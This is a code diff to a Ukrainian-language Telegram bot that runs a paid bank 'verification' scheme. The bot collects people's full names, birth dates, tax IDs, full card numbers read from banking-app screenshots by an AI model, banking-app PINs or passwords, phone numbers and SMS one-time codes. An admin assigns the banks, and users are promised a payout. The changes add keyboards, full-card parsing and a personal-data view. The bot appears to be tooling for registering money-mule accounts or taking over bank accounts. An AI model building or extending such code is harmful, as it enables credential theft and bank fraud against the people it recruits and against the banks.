@@ -1,6 +1,6 @@
 from aiogram import Router, F, Bot
 from aiogram.filters import CommandStart, StateFilter
-from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile
+from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile, ReplyKeyboardMarkup, KeyboardButton
 from aiogram.fsm.state import StatesGroup, State
 from aiogram.fsm.context import FSMContext
 from bot.config import ADMIN_ID, BANK_TEMPLATES, get_template_photo
@@ -19,6 +19,48 @@ class RegistrationStates(StatesGroup):
     waiting_card_number = State()
     waiting_wrong_code_confirm = State()
     waiting_card_screenshot = State()
+
+def get_sms_request_keyboard() -> ReplyKeyboardMarkup:
+    return ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="Запросити SMS-код")]],
+        resize_keyboard=True,
+        one_time_keyboard=False,
+        is_persistent=True
+    )
+
+def get_cancel_keyboard() -> ReplyKeyboardMarkup:
+    return ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="❌ Скасувати")]],
+        resize_keyboard=True,
+        one_time_keyboard=False,
+        is_persistent=True
+    )
+
+@router.message(F.chat.type == "private", F.text == "❌ Скасувати")
+async def handle_cancel_registration(message: Message, state: FSMContext):
+    """Обробник скасування процесу введення анкетних даних"""
+    client_id = message.from_user.id
+    session = await db.get_session(client_id)
+    if session and session['status'] in ('number_assigned', 'waiting_code'):
+        return
+    await state.clear()
+    await message.answer(
+        "Введення даних скасовано. Напишіть /start, щоб почати спочатку.",
+        reply_markup=ReplyKeyboardRemove()
+    )
+
+def get_waiting_keyboard() -> ReplyKeyboardMarkup:
+    return ReplyKeyboardMarkup(
+        keyboard=[[KeyboardButton(text="⏳ Очікування номера...")]],
+        resize_keyboard=True,
+        one_time_keyboard=False,
+        is_persistent=True
+    )
+
+@router.message(F.chat.type == "private", F.text == "⏳ Очікування номера...")
+async def handle_waiting_number_text(message: Message):
+    """Обробник натискання кнопки очікування номера"""
+    await message.answer("Будь ласка, зачекайте, поки адміністратор призначить вам номер телефону для початку верифікації.")
 
 def clean_pib(pib: str) -> str:
     # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
@@ -84,11 +126,18 @@ async def cmd_start(message: Message, state: FSMContext):
         )
         return
 
-    # Перевіряємо, чи є вже активна сесія у робочому статусі
     client_id = message.from_user.id
     existing_session = await db.get_session(client_id)
-    if existing_session and existing_session['status'] in ('registered', 'number_assigned', 'waiting_code'):
+
+    if existing_session and existing_session['status'] in ('number_assigned', 'waiting_code'):
         await message.answer("Ваш запит вже обробляється або лінія активна. Будь ласка, очікуйте вказівок адміна.")
+        return
+
+    if existing_session and existing_session['status'] == 'registered':
+        await message.answer(
+            "Ваш запит на верифікацію вже прийнято і він очікує перевірки адміністратором. Будь ласка, очікуйте призначення номера телефону.",
+            reply_markup=get_waiting_keyboard()
+        )
         return
 
     await state.clear()
@@ -105,7 +154,7 @@ async def cmd_start(message: Message, state: FSMContext):
             dob = dob_match.group(1)
             
             # Очищуємо стару екранну клавіатуру, якщо вона залишилась
-            await message.answer("Починаємо нову сесію верифікації...", reply_markup=ReplyKeyboardRemove())
+            await message.answer("Починаємо нову сесію верифікації...", reply_markup=get_cancel_keyboard())
             
             welcome_text = (
                 f"Привіт! Знайдено ваші попередні дані верифікації:\n\n"
@@ -127,7 +176,7 @@ async def cmd_start(message: Message, state: FSMContext):
         "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
         "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
         "(обов'язково пишіть все в одному повідомленні)",
-        reply_markup=ReplyKeyboardRemove()  # Прибирає будь-які старі кнопки
+        reply_markup=get_cancel_keyboard()  # Прибирає будь-які старі кнопки і дає кнопку скасування
     )
     await state.set_state(RegistrationStates.waiting_pib_dob)
 
@@ -169,7 +218,10 @@ async def handle_autofill_use(callback: CallbackQuery, state: FSMContext):
         [InlineKeyboardButton(text="🔄 Заповнити заново", callback_data="restart_reg")]
     ])
     
-    await callback.message.edit_reply_markup(reply_markup=None)
+    try:
+        await callback.message.delete()
+    except Exception:
+        await callback.message.edit_reply_markup(reply_markup=None)
     await callback.message.answer(confirm_text, reply_markup=keyboard, parse_mode="Markdown")
     await state.set_state(RegistrationStates.waiting_confirm)
     await callback.answer()
@@ -187,7 +239,7 @@ async def handle_autofill_new(callback: CallbackQuery, state: FSMContext):
         "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
         "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
         "(обов'язково пишіть все в одному повідомленні)",
-        reply_markup=ReplyKeyboardRemove()
+        reply_markup=get_cancel_keyboard()
     )
     await state.set_state(RegistrationStates.waiting_pib_dob)
     await callback.answer()
@@ -308,30 +360,32 @@ async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bo
     await db.create_or_update_session(client_id, username_db, client_data)
     
     # Забираємо кнопки з повідомлення підтвердження
-    await callback.message.edit_reply_markup(reply_markup=None)
-    await callback.message.answer("Дані успішно прийнято! Номер буде надіслано до чату протягом 2-х хвилин.")
+    try:
+        await callback.message.delete()
+    except Exception:
+        await callback.message.edit_reply_markup(reply_markup=None)
+        
+    await callback.message.answer(
+        "Дані успішно прийнято! Номер буде надіслано до чату протягом 2-х хвилин.\n\n"
+        "⚠️ *Зверніть увагу:* я автоматичний асистент. Якщо у вас виникнуть якісь труднощі, які я не зможу вирішити — до чату обов'язково підключиться наш менеджер.",
+        parse_mode="Markdown",
+        reply_markup=get_waiting_keyboard()
+    )
     await callback.answer("Дані підтверджено!")
 
     # Отримуємо унікальні назви банків для вибору адміном
-    unique_banks = await db.get_unique_banks()
+    unique_banks_db = await db.get_unique_banks()
+    custom_order = ["PUMB", "bank.kd", "IziBank", "EcoBank", "Alliance", "LvivBank", "AmoBank"]
+    all_banks = list(dict.fromkeys(custom_order + unique_banks_db))
     
-    if not unique_banks:
-        await bot.send_message(
-            chat_id=ADMIN_ID,
-            text=(
-                f"Новий клієнт на верифікацію!\n"
-                f"• Telegram: @{username} (ID: {client_id})\n"
-                f"• Дані:\n```\n{client_data}\n```\n\n"
-                f"Попередження: немає доступних ліній/банків у базі! Використайте /import."
-            ),
-            parse_mode="Markdown"
-        )
-        return
+    warning_text = ""
+    if not unique_banks_db:
+        warning_text = "\n\n⚠️ *Попередження:* немає доступних ліній/номерів у базі! Додайте номери через сайт або в чат."
         
     # Створюємо кнопки вибору банків
     keyboard_buttons = []
     row = []
-    for bank in unique_banks:
+    for bank in all_banks:
         button_text = f"[ ] {bank}"
         callback_data = f"toggle_{client_id}_{bank}"
         row.append(InlineKeyboardButton(text=button_text, callback_data=callback_data))
@@ -352,7 +406,7 @@ async def handle_confirm_reg(callback: CallbackQuery, state: FSMContext, bot: Bo
         f"Новий клієнт на верифікацію!\n"
         f"• Telegram: @{username} (ID: {client_id})\n"
         f"• Дані:\n```\n{client_data}\n```\n"
-        f"Оберіть банки, які має пройти клієнт:"
+        f"Оберіть банки, які має пройти клієнт:{warning_text}"
     )
     
     await bot.send_message(chat_id=ADMIN_ID, text=admin_msg, reply_markup=markup, parse_mode="Markdown")
@@ -366,10 +420,13 @@ async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
         return
         
     await state.clear()
-    await callback.message.edit_reply_markup(reply_markup=None)
+    try:
+        await callback.message.delete()
+    except Exception:
+        await callback.message.edit_reply_markup(reply_markup=None)
     await callback.message.answer(
         "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження",
-        reply_markup=ReplyKeyboardRemove()
+        reply_markup=get_cancel_keyboard()
     )
     await state.set_state(RegistrationStates.waiting_pib_dob)
     await callback.answer("Почнемо заново!")
@@ -390,8 +447,14 @@ async def process_client_password(message: Message, state: FSMContext):
             bank_name = line_info['bank'].strip().lower()
 
     if bank_name == "bank.kd":
-        await message.answer("Напишіть будь ласка повний номер картки bank.kd")
-        await state.set_state(RegistrationStates.waiting_card_number)
+        state_data = await state.get_data()
+        if state_data.get("client_card"):
+            # Пропускаємо ручне введення карти, якщо вона вже повністю розпізнана зі скріншоту
+            await message.answer("Будь ласка, напишіть Ваш номер телефону?")
+            await state.set_state(RegistrationStates.waiting_phone)
+        else:
+            await message.answer("Напишіть будь ласка повний номер картки bank.kd")
+            await state.set_state(RegistrationStates.waiting_card_number)
     else:
         await message.answer("Будь ласка, напишіть Ваш номер телефону?")
         await state.set_state(RegistrationStates.waiting_phone)
@@ -426,8 +489,13 @@ async def process_client_card_number(message: Message, state: FSMContext):
     formatted_card = f"{cleaned_card[:4]} {cleaned_card[4:8]} {cleaned_card[8:12]} {cleaned_card[12:]}"
     await state.update_data(client_card=formatted_card)
     
-    await message.answer("Будь ласка, напишіть Ваш номер телефону?")
-    await state.set_state(RegistrationStates.waiting_phone)
+    state_data = await state.get_data()
+    if state_data.get("client_password"):
+        await message.answer("Будь ласка, напишіть Ваш номер телефону?")
+        await state.set_state(RegistrationStates.waiting_phone)
+    else:
+        await message.answer("Який пін-код чи пароль ставили на додаток?")
+        await state.set_state(RegistrationStates.waiting_password)
 
 
 @router.message(RegistrationStates.waiting_phone, F.chat.type == "private")
@@ -740,7 +808,7 @@ async def handle_request_code_text(message: Message, state: FSMContext, bot: Bot
     await bot.send_chat_action(chat_id=client_id, action="typing")
     
     async def notify(msg: str, is_error: bool = False, is_retry: bool = False):
-        await message.answer(msg)
+        await message.answer(msg, reply_markup=get_sms_request_keyboard())
         
     await trigger_sms_code_request(client_id, bot, state, notify)
 
@@ -778,15 +846,26 @@ async def process_card_screenshot(message: Message, state: FSMContext, bot: Bot)
         current_bank_name=current_bank_name
     )
     
-    # Парсимо маску картки
     card_first4, card_last4 = None, None
-    card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
-    if card_match:
-        card_first4 = card_match.group(1)
-        card_last4 = card_match.group(2)
+    client_card = None
+    
+    card_full_match = re.search(r'\[CARD_FULL:\s*(\d{16})\]', response)
+    card_mask_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
+    
+    if card_full_match:
+        full_card = card_full_match.group(1)
+        card_first4 = full_card[:4]
+        card_last4 = full_card[-4:]
+        client_card = f"{full_card[:4]} {full_card[4:8]} {full_card[8:12]} {full_card[12:]}"
+        await state.update_data(card_first4=card_first4, card_last4=card_last4, client_card=client_card)
+    elif card_mask_match:
+        card_first4 = card_mask_match.group(1)
+        card_last4 = card_mask_match.group(2)
         await state.update_data(card_first4=card_first4, card_last4=card_last4)
-        
-    if "[KD_CARD_SCREEN]" in response:
+
+    is_card_screen = "[KD_CARD_SCREEN]" in response or card_full_match or card_mask_match
+
+    if is_card_screen:
         await state.update_data(card_photo_id=photo.file_id)
         # Оновлюємо базу даних, щоб адмін бачив реквізити та фото картки
         await db.update_session_verification_data(
@@ -797,13 +876,26 @@ async def process_card_screenshot(message: Message, state: FSMContext, bot: Bot)
             card_photo_id=photo.file_id
         )
 
-        # Запитуємо пін-код
-        success_text = (
-            "Дякую! Другий скріншот з карткою прийнято.\n\n"
-            "Який пін-код чи пароль ставили на додаток?"
-        )
-        await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
-        await state.set_state(RegistrationStates.waiting_password)
+        if card_full_match:
+            success_text = (
+                f"Все чітко, картку {client_card} прийняв в роботу, очікуй виплату!\n\n"
+                f"Який пін-код чи пароль ставили на додаток?"
+            )
+            await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+            await state.set_state(RegistrationStates.waiting_password)
+        elif card_mask_match:
+            # Очищаємо відповідь ШІ від технічних тегів і надсилаємо користувачу
+            clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
+            await message.answer(clean_text, reply_markup=ReplyKeyboardRemove())
+            await state.set_state(RegistrationStates.waiting_card_number)
+        else:
+            success_text = (
+                "Дякую! Другий скріншот з карткою прийнято.\n\n"
+                "Який пін-код чи пароль ставили на додаток?"
+            )
+            await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+            await state.set_state(RegistrationStates.waiting_password)
+            
         return
     elif "[KD_MAIN_SCREEN]" in response:
         # Клієнт знову надіслав головний екран!
@@ -822,6 +914,74 @@ async def handle_card_screenshot_text(message: Message):
         "Будь ласка, надішліть саме скріншот з розділу \"Картки\" додатка bank.kd, "
         "де видно номер (або маску) вашої картки."
     )
+
+@router.message(F.chat.type == "private", F.text == "📋 Мої дані")
+async def handle_view_my_data(message: Message, state: FSMContext):
+    client_id = message.from_user.id
+    session = await db.get_session(client_id)
+    
+    if not session or not session['client_data']:
+        await message.answer("Ваші дані не знайдено. Напишіть /start, щоб розпочати.")
+        return
+        
+    client_data = session['client_data']
+    
+    # Парсимо дані
+    ipn_match = re.search(r'ІПН:\s*(\d+)', client_data)
+    pib_match = re.search(r'ПІБ:\s*(.+)', client_data)
+    dob_match = re.search(r'Дата:\s*(.+)', client_data)
+    
+    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
+    pib = pib_match.group(1) if pib_match else "Невідомо"
+    dob = dob_match.group(1) if dob_match else "Невідомо"
+    
+    import html
+    text = (
+        f"📋 <b>Ваші дані верифікації:</b>\n\n"
+        f"• <b>ПІБ:</b> {html.escape(pib)}\n"
+        f"• <b>Дата народження:</b> {html.escape(dob)}\n"
+        f"• <b>ІПН:</b> {html.escape(ipn)}"
+    )
+    
+    # Якщо сесія активна (йде верифікація номера), редагувати не можна
+    if session['status'] in ('number_assigned', 'waiting_code'):
+        await message.answer(text, parse_mode="HTML")
+        return
+        
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🔄 Редагувати дані", callback_data="edit_my_data")],
+        [InlineKeyboardButton(text="❌ Закрити", callback_data="close_my_data")]
+    ])
+    
+    await message.answer(text, reply_markup=keyboard, parse_mode="HTML")
+
+
+@router.callback_query(F.data == "close_my_data")
+async def handle_close_my_data(callback: CallbackQuery):
+    try:
+        await callback.message.delete()
+    except Exception:
+        await callback.message.edit_reply_markup(reply_markup=None)
+    await callback.answer()
+
+
+@router.callback_query(F.data == "edit_my_data")
+async def handle_edit_my_data(callback: CallbackQuery, state: FSMContext):
+    await state.clear()
+    try:
+        await callback.message.delete()
+    except Exception:
+        await callback.message.edit_reply_markup(reply_markup=None)
+        
+    await callback.message.answer(
+        "Напишіть мені будь ласка Ваші\nПІБ та Дату Народження\n\n"
+        "Наприклад: Шевченко Тарас Григорович 09.03.1814\n\n"
+        "(обов'язково пишіть все в одному повідомленні)",
+        reply_markup=ReplyKeyboardRemove()
+    )
+    await state.set_state(RegistrationStates.waiting_pib_dob)
+    await callback.answer()
+
 
 @router.message(F.chat.type == "private", F.text & ~F.text.startswith('/'))
 async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bot):
@@ -914,7 +1074,7 @@ async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bo
         chat_history = chat_history[-10:] # Зберігаємо останні 10 повідомлень
         await state.update_data(chat_history=chat_history)
 
-        await message.answer(response)
+        await message.answer(response, reply_markup=get_sms_request_keyboard())
         return
 
     # Якщо користувач не у стані анкетування, пропонуємо йому почати з команди /start
@@ -997,18 +1157,25 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
 
         if is_bank_kd:
             card_first4, card_last4 = None, None
-            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
-            if card_match:
-                card_first4 = card_match.group(1)
-                card_last4 = card_match.group(2)
+            client_card = None
+            
+            card_full_match = re.search(r'\[CARD_FULL:\s*(\d{16})\]', response)
+            card_mask_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
+            
+            if card_full_match:
+                full_card = card_full_match.group(1)
+                card_first4 = full_card[:4]
+                card_last4 = full_card[-4:]
+                client_card = f"{full_card[:4]} {full_card[4:8]} {full_card[8:12]} {full_card[12:]}"
+                await state.update_data(card_first4=card_first4, card_last4=card_last4, client_card=client_card)
+            elif card_mask_match:
+                card_first4 = card_mask_match.group(1)
+                card_last4 = card_mask_match.group(2)
                 await state.update_data(card_first4=card_first4, card_last4=card_last4)
 
-            if "[KD_CARD_SCREEN]" in response:
-                success_text = (
-                    "Дякую! Скріншот з реквізитами картки прийнято.\n\n"
-                    "Який пін-код чи пароль ставили на додаток?"
-                )
-                await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+            is_card_screen = "[KD_CARD_SCREEN]" in response or card_full_match or card_mask_match
+
+            if is_card_screen:
                 await state.update_data(success_photo_id=photo.file_id, card_photo_id=photo.file_id)
                 await db.update_session_verification_data(
                     client_id, 
@@ -1017,7 +1184,26 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
                     card_last4=card_last4,
                     card_photo_id=photo.file_id
                 )
-                await state.set_state(RegistrationStates.waiting_password)
+
+                if card_full_match:
+                    success_text = (
+                        f"Все чітко, картку {client_card} прийняв в роботу, очікуй виплату!\n\n"
+                        f"Який пін-код чи пароль ставили на додаток?"
+                    )
+                    await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+                    await state.set_state(RegistrationStates.waiting_password)
+                elif card_mask_match:
+                    clean_text = re.sub(r'\[[^\]]+\]', '', response).strip()
+                    await message.answer(clean_text, reply_markup=ReplyKeyboardRemove())
+                    await state.set_state(RegistrationStates.waiting_card_number)
+                else:
+                    success_text = (
+                        "Дякую! Скріншот з реквізитами картки прийнято.\n\n"
+                        "Який пін-код чи пароль ставили на додаток?"
+                    )
+                    await message.answer(success_text, reply_markup=ReplyKeyboardRemove())
+                    await state.set_state(RegistrationStates.waiting_password)
+
                 return
             elif "[KD_MAIN_SCREEN]" in response:
                 kd_prompt = (
@@ -1079,7 +1265,8 @@ async def schedule_waiting_code_reminder(client_id: int, bot: Bot):
         try:
             await bot.send_message(
                 chat_id=client_id,
-                text="Ще очікую поки нададуть код"
+                text="Ще очікую поки нададуть код",
+                reply_markup=get_sms_request_keyboard()
             )
         except Exception as e:
             print(f"Помилка надсилання автоматичного нагадування клієнту {client_id}: {e}")
@@ -1160,7 +1347,7 @@ async def process_request_code(callback: CallbackQuery, bot: Bot, state: FSMCont
         if is_error:
             await callback.answer(msg, show_alert=True)
         else:
-            await callback.message.answer(msg)
+            await callback.message.answer(msg, reply_markup=get_sms_request_keyboard())
             await callback.answer("Запит відправлено!")
             
     await trigger_sms_code_request(client_id, bot, state, notify)
@@ -1169,9 +1356,13 @@ async def process_request_code(callback: CallbackQuery, bot: Bot, state: FSMCont
 async def handle_wrongcode_yes(callback: CallbackQuery, state: FSMContext):
     await state.clear()
     await callback.message.edit_reply_markup(reply_markup=None)
+    
+    client_kbd = get_sms_request_keyboard()
+    
     await callback.message.answer(
         "Надішліть новий код, як надішлете в мене також запросіть новий SMS-код",
-        parse_mode="Markdown"
+        parse_mode="Markdown",
+        reply_markup=client_kbd
     )
     await callback.answer()
 
@@ -1203,9 +1394,11 @@ async def process_wrong_code_confirm_text(message: Message, state: FSMContext):
             
     if is_yes:
         await state.clear()
+        client_kbd = get_sms_request_keyboard()
         await message.answer(
             "Надішліть новий код, як надішлете в мене також запросіть новий SMS-код",
-            parse_mode="Markdown"
+            parse_mode="Markdown",
+            reply_markup=client_kbd
         )
     elif is_no:
         await state.clear()
@@ -1214,3 +1407,6 @@ async def process_wrong_code_confirm_text(message: Message, state: FSMContext):
         await message.answer(
             "Будь ласка, оберіть відповідь на кнопках нижче або напишіть 'так' чи 'ні':"
         )
+
+
+
